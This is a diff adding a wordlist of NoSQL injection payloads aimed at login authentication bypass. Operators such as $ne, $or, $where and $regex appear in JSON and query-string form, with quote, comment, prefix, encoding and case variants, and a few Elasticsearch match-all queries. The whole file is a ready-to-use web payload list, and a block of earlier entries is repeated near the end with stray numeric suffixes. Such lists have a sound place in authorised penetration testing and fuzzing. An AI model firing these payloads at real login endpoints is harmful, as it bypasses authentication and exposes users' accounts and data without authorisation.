@@ -1,0 +1,312 @@
+{"username":{"$ne":null},"password":{"$ne":null}}
+{"username":{"$ne":null},"password":{"$ne":null}}--
+{"username":{"$ne":null},"password":{"$ne":null}}#
+{"username":{"$ne":null},"password":{"$ne":null}}/*
+{"username":{"$ne":null},"password":{"$ne":null}}%0a
+{"username":{"$ne":null},"password":{"$ne":null}}%00
+'{"username":{"$ne":null},"password":{"$ne":null}}
+'{"username":{"$ne":null},"password":{"$ne":null}}--
+'{"username":{"$ne":null},"password":{"$ne":null}}#
+'{"username":{"$ne":null},"password":{"$ne":null}}/*
+'{"username":{"$ne":null},"password":{"$ne":null}}%0a
+'{"username":{"$ne":null},"password":{"$ne":null}}%00
+"{"username":{"$ne":null},"password":{"$ne":null}}
+"{"username":{"$ne":null},"password":{"$ne":null}}--
+"{"username":{"$ne":null},"password":{"$ne":null}}#
+"{"username":{"$ne":null},"password":{"$ne":null}}/*
+"{"username":{"$ne":null},"password":{"$ne":null}}%0a
+"{"username":{"$ne":null},"password":{"$ne":null}}%00
+{"username":{"$ne":null},"password":{"$ne":null}};
+{"username":{"$ne":null},"password":{"$ne":null}}'
+{"username":{"$ne":null},"password":{"$ne":null}}"
+{"username":{"$ne":null},"password":{"$ne":null}})
+{"username":{"$ne":null},"password":{"$ne":null}} //
+X-{"username":{"$ne":null},"password":{"$ne":null}}
+X-{"username":{"$ne":null},"password":{"$ne":null}};
+X-{"username":{"$ne":null},"password":{"$ne":null}}'
+X-{"username":{"$ne":null},"password":{"$ne":null}}"
+X-{"username":{"$ne":null},"password":{"$ne":null}})
+X-{"username":{"$ne":null},"password":{"$ne":null}} //
+test-{"username":{"$ne":null},"password":{"$ne":null}}
+test-{"username":{"$ne":null},"password":{"$ne":null}};
+test-{"username":{"$ne":null},"password":{"$ne":null}}'
+test-{"username":{"$ne":null},"password":{"$ne":null}}"
+test-{"username":{"$ne":null},"password":{"$ne":null}})
+test-{"username":{"$ne":null},"password":{"$ne":null}} //
+%7B%22username%22%3A%7B%22%24ne%22%3Anull%7D%2C%22password%22%3A%7B%22%24ne%22%3Anull%7D%7D
+%257B%2522username%2522%253A%257B%2522%2524ne%2522%253Anull%257D%252C%2522password%2522%253A%257B%2522%2524ne%2522%253Anull%257D%257D
+{"USERNAME":{"$NE":NULL},"PASSWORD":{"$NE":NULL}}
+{"uSeRnAmE":{"$Ne":NuLl},"pAsSwOrD":{"$Ne":NuLl}}
+{"$or":[{},{"$gt":""}]}
+{"$or":[{},{"$gt":""}]}--
+{"$or":[{},{"$gt":""}]}#
+{"$or":[{},{"$gt":""}]}/*
+{"$or":[{},{"$gt":""}]}%0a
+{"$or":[{},{"$gt":""}]}%00
+'{"$or":[{},{"$gt":""}]}
+'{"$or":[{},{"$gt":""}]}--
+'{"$or":[{},{"$gt":""}]}#
+'{"$or":[{},{"$gt":""}]}/*
+'{"$or":[{},{"$gt":""}]}%0a
+'{"$or":[{},{"$gt":""}]}%00
+"{"$or":[{},{"$gt":""}]}
+"{"$or":[{},{"$gt":""}]}--
+"{"$or":[{},{"$gt":""}]}#
+"{"$or":[{},{"$gt":""}]}/*
+"{"$or":[{},{"$gt":""}]}%0a
+"{"$or":[{},{"$gt":""}]}%00
+{"$or":[{},{"$gt":""}]};
+{"$or":[{},{"$gt":""}]}'
+{"$or":[{},{"$gt":""}]}"
+{"$or":[{},{"$gt":""}]})
+{"$or":[{},{"$gt":""}]} //
+X-{"$or":[{},{"$gt":""}]}
+X-{"$or":[{},{"$gt":""}]};
+X-{"$or":[{},{"$gt":""}]}'
+X-{"$or":[{},{"$gt":""}]}"
+X-{"$or":[{},{"$gt":""}]})
+X-{"$or":[{},{"$gt":""}]} //
+test-{"$or":[{},{"$gt":""}]}
+test-{"$or":[{},{"$gt":""}]};
+test-{"$or":[{},{"$gt":""}]}'
+test-{"$or":[{},{"$gt":""}]}"
+test-{"$or":[{},{"$gt":""}]})
+test-{"$or":[{},{"$gt":""}]} //
+%7B%22%24or%22%3A%5B%7B%7D%2C%7B%22%24gt%22%3A%22%22%7D%5D%7D
+%257B%2522%2524or%2522%253A%255B%257B%257D%252C%257B%2522%2524gt%2522%253A%2522%2522%257D%255D%257D
+{"$OR":[{},{"$GT":""}]}
+{"$Or":[{},{"$gT":""}]}
+{"$where":"return true;"}
+{"$where":"return true;"}--
+{"$where":"return true;"}#
+{"$where":"return true;"}/*
+{"$where":"return true;"}%0a
+{"$where":"return true;"}%00
+'{"$where":"return true;"}
+'{"$where":"return true;"}--
+'{"$where":"return true;"}#
+'{"$where":"return true;"}/*
+'{"$where":"return true;"}%0a
+'{"$where":"return true;"}%00
+"{"$where":"return true;"}
+"{"$where":"return true;"}--
+"{"$where":"return true;"}#
+"{"$where":"return true;"}/*
+"{"$where":"return true;"}%0a
+"{"$where":"return true;"}%00
+{"$where":"return true;"};
+{"$where":"return true;"}'
+{"$where":"return true;"}"
+{"$where":"return true;"})
+{"$where":"return true;"} //
+X-{"$where":"return true;"}
+X-{"$where":"return true;"};
+X-{"$where":"return true;"}'
+X-{"$where":"return true;"}"
+X-{"$where":"return true;"})
+X-{"$where":"return true;"} //
+test-{"$where":"return true;"}
+test-{"$where":"return true;"};
+test-{"$where":"return true;"}'
+test-{"$where":"return true;"}"
+test-{"$where":"return true;"})
+test-{"$where":"return true;"} //
+%7B%22%24where%22%3A%22return%20true%3B%22%7D
+%257B%2522%2524where%2522%253A%2522return%2520true%253B%2522%257D
+{"$where":"return%20true;"}
+{"$where":"return+true;"}
+{"$where":"return/**/true;"}
+{"$WHERE":"RETURN TRUE;"}
+{"$WhErE":"ReTuRn tRuE;"}
+username[$ne]=foo&password[$ne]=bar
+username[$ne]=foo&password[$ne]=bar--
+username[$ne]=foo&password[$ne]=bar#
+username[$ne]=foo&password[$ne]=bar/*
+username[$ne]=foo&password[$ne]=bar%0a
+username[$ne]=foo&password[$ne]=bar%00
+'username[$ne]=foo&password[$ne]=bar
+'username[$ne]=foo&password[$ne]=bar--
+'username[$ne]=foo&password[$ne]=bar#
+'username[$ne]=foo&password[$ne]=bar/*
+'username[$ne]=foo&password[$ne]=bar%0a
+'username[$ne]=foo&password[$ne]=bar%00
+"username[$ne]=foo&password[$ne]=bar
+"username[$ne]=foo&password[$ne]=bar--
+"username[$ne]=foo&password[$ne]=bar#
+"username[$ne]=foo&password[$ne]=bar/*
+"username[$ne]=foo&password[$ne]=bar%0a
+"username[$ne]=foo&password[$ne]=bar%00
+username[$ne]=foo&password[$ne]=bar;
+username[$ne]=foo&password[$ne]=bar'
+username[$ne]=foo&password[$ne]=bar"
+username[$ne]=foo&password[$ne]=bar)
+username[$ne]=foo&password[$ne]=bar //
+X-username[$ne]=foo&password[$ne]=bar
+X-username[$ne]=foo&password[$ne]=bar;
+X-username[$ne]=foo&password[$ne]=bar'
+X-username[$ne]=foo&password[$ne]=bar"
+X-username[$ne]=foo&password[$ne]=bar)
+X-username[$ne]=foo&password[$ne]=bar //
+test-username[$ne]=foo&password[$ne]=bar
+test-username[$ne]=foo&password[$ne]=bar;
+test-username[$ne]=foo&password[$ne]=bar'
+test-username[$ne]=foo&password[$ne]=bar"
+test-username[$ne]=foo&password[$ne]=bar)
+test-username[$ne]=foo&password[$ne]=bar //
+username%5B%24ne%5D%3Dfoo%26password%5B%24ne%5D%3Dbar
+username%255B%2524ne%255D%253Dfoo%2526password%255B%2524ne%255D%253Dbar
+USERNAME[$NE]=FOO&PASSWORD[$NE]=BAR
+uSeRnAmE[$nE]=fOo&pAsSwOrD[$nE]=bAr
+user=admin&pass[$ne]=1
+user=admin&pass[$ne]=1--
+user=admin&pass[$ne]=1#
+user=admin&pass[$ne]=1/*
+user=admin&pass[$ne]=1%0a
+user=admin&pass[$ne]=1%00
+'user=admin&pass[$ne]=1
+'user=admin&pass[$ne]=1--
+'user=admin&pass[$ne]=1#
+'user=admin&pass[$ne]=1/*
+'user=admin&pass[$ne]=1%0a
+'user=admin&pass[$ne]=1%00
+"user=admin&pass[$ne]=1
+"user=admin&pass[$ne]=1--
+"user=admin&pass[$ne]=1#
+"user=admin&pass[$ne]=1/*
+"user=admin&pass[$ne]=1%0a
+"user=admin&pass[$ne]=1%00
+user=admin&pass[$ne]=1;
+user=admin&pass[$ne]=1'
+user=admin&pass[$ne]=1"
+user=admin&pass[$ne]=1)
+user=admin&pass[$ne]=1 //
+X-user=admin&pass[$ne]=1
+X-user=admin&pass[$ne]=1;
+X-user=admin&pass[$ne]=1'
+X-user=admin&pass[$ne]=1"
+X-user=admin&pass[$ne]=1)
+X-user=admin&pass[$ne]=1 //
+test-user=admin&pass[$ne]=1
+test-user=admin&pass[$ne]=1;
+test-user=admin&pass[$ne]=1'
+test-user=admin&pass[$ne]=1"
+test-user=admin&pass[$ne]=1)
+test-user=admin&pass[$ne]=1 //
+user%3Dadmin%26pass%5B%24ne%5D%3D1
+user%253Dadmin%2526pass%255B%2524ne%255D%253D1
+USER=ADMIN&PASS[$NE]=1
+uSeR=AdMiN&PaSs[$Ne]=1
+username[$regex]=.*&password[$regex]=.*
+username[$regex]=.*&password[$regex]=.*--
+username[$regex]=.*&password[$regex]=.*#
+username[$regex]=.*&password[$regex]=.*/*
+username[$regex]=.*&password[$regex]=.*%0a
+username[$regex]=.*&password[$regex]=.*%00
+'username[$regex]=.*&password[$regex]=.*
+'username[$regex]=.*&password[$regex]=.*--
+'username[$regex]=.*&password[$regex]=.*#
+'username[$regex]=.*&password[$regex]=.*/*
+'username[$regex]=.*&password[$regex]=.*%0a
+'username[$regex]=.*&password[$regex]=.*%00
+"username[$regex]=.*&password[$regex]=.*
+"username[$regex]=.*&password[$regex]=.*--
+"username[$regex]=.*&password[$regex]=.*#
+"username[$regex]=.*&password[$regex]=.*/*
+"username[$regex]=.*&password[$regex]=.*%0a
+"username[$regex]=.*&password[$regex]=.*%00
+username[$regex]=.*&password[$regex]=.*;
+username[$regex]=.*&password[$regex]=.*'
+username[$regex]=.*&password[$regex]=.*"
+username[$regex]=.*&password[$regex]=.*)
+username[$regex]=.*&password[$regex]=.* //
+X-username[$regex]=.*&password[$regex]=.*
+X-username[$regex]=.*&password[$regex]=.*;
+X-username[$regex]=.*&password[$regex]=.*'
+X-username[$regex]=.*&password[$regex]=.*"
+X-username[$regex]=.*&password[$regex]=.*)
+X-username[$regex]=.*&password[$regex]=.* //
+test-username[$regex]=.*&password[$regex]=.*
+test-username[$regex]=.*&password[$regex]=.*;
+test-username[$regex]=.*&password[$regex]=.*'
+test-username[$regex]=.*&password[$regex]=.*"
+test-username[$regex]=.*&password[$regex]=.*)
+test-username[$regex]=.*&password[$regex]=.* //
+username%5B%24regex%5D%3D.%2A%26password%5B%24regex%5D%3D.%2A
+username%255B%2524regex%255D%253D.%252A%2526password%255B%2524regex%255D%253D.%252A
+USERNAME[$REGEX]=.*&PASSWORD[$REGEX]=.*
+uSeRnAmE[$rEgEx]=.*&pAsSwOrD[$rEgEx]=.*
+username=admin&password[$type]=1
+username=admin&password[$type]=1--
+username=admin&password[$type]=1#
+username=admin&password[$type]=1/*
+username=admin&password[$type]=1%0a
+username=admin&password[$type]=1%00
+'username=admin&password[$type]=1
+'username=admin&password[$type]=1--
+'username=admin&password[$type]=1#
+'username=admin&password[$type]=1/*
+'username=admin&password[$type]=1%0a
+'username=admin&password[$type]=1%00
+"username=admin&password[$type]=1
+"username=admin&password[$type]=1--
+"username=admin&password[$type]=1#
+"username=admin&password[$type]=1/*
+"username=admin&password[$type]=1%0a
+"username=admin&password[$type]=1%00
+username=admin&password[$type]=1;
+username=admin&password[$type]=1'
+username=admin&password[$type]=1"
+username=admin&password[$type]=1)
+username=admin&password[$type]=1 //
+X-username=admin&password[$type]=1
+X-username=admin&password[$type]=1;
+X-username=admin&password[$type]=1'
+X-username=admin&password[$type]=1"
+X-username=admin&password[$type]=1)
+X-username=admin&password[$type]=1 //
+test-username=admin&password[$type]=1
+test-username=admin&password[$type]=1;
+test-username=admin&password[$type]=1'
+test-username=admin&password[$type]=1"
+test-username=admin&password[$type]=1)
+test-username=admin&password[$type]=1 //
+username%3Dadmin%26password%5B%24type%5D%3D1
+username%253Dadmin%2526password%255B%2524type%255D%253D1
+USERNAME=ADMIN&PASSWORD[$TYPE]=1
+uSeRnAmE=AdMiN&PaSsWoRd[$TyPe]=1
+{"username":{"$ne":null},"password":{"$ne":null}}#276
+{"username":{"$ne":null},"password":{"$ne":null}}--#277
+{"username":{"$ne":null},"password":{"$ne":null}}##278
+{"username":{"$ne":null},"password":{"$ne":null}}/*#279
+{"username":{"$ne":null},"password":{"$ne":null}}%0a#280
+{"username":{"$ne":null},"password":{"$ne":null}}%00#281
+'{"username":{"$ne":null},"password":{"$ne":null}}#282
+'{"username":{"$ne":null},"password":{"$ne":null}}--#283
+'{"username":{"$ne":null},"password":{"$ne":null}}##284
+'{"username":{"$ne":null},"password":{"$ne":null}}/*#285
+'{"username":{"$ne":null},"password":{"$ne":null}}%0a#286
+'{"username":{"$ne":null},"password":{"$ne":null}}%00#287
+"{"username":{"$ne":null},"password":{"$ne":null}}#288
+"{"username":{"$ne":null},"password":{"$ne":null}}--#289
+"{"username":{"$ne":null},"password":{"$ne":null}}##290
+"{"username":{"$ne":null},"password":{"$ne":null}}/*#291
+"{"username":{"$ne":null},"password":{"$ne":null}}%0a#292
+"{"username":{"$ne":null},"password":{"$ne":null}}%00#293
+{"username":{"$ne":null},"password":{"$ne":null}};#294
+{"username":{"$ne":null},"password":{"$ne":null}}'#295
+{"username":{"$ne":null},"password":{"$ne":null}}"#296
+{"username":{"$ne":null},"password":{"$ne":null}})#297
+{"username":{"$ne":null},"password":{"$ne":null}} //#298
+X-{"username":{"$ne":null},"password":{"$ne":null}}#299
+{"$ne": ""}
+{"$gt": null}
+{"$exists": true}
+{"$not": {"$size": 0}}
+{"$or":[{"role":{"$ne":"user"}},{"role":{"$exists":false}}]}
+{"$where":"this.password && this.password.length>0"}
+username=admin&password[$ne]=
+filter={"age":{"$gte":0}}
+q={"match_all":{}}
+q={"query_string":{"query":"*"}}
+username[$regex]=^.*$&password[$regex]=^.*$
+{"$or":[{"username":null},{"username":{"$exists":false}}]}
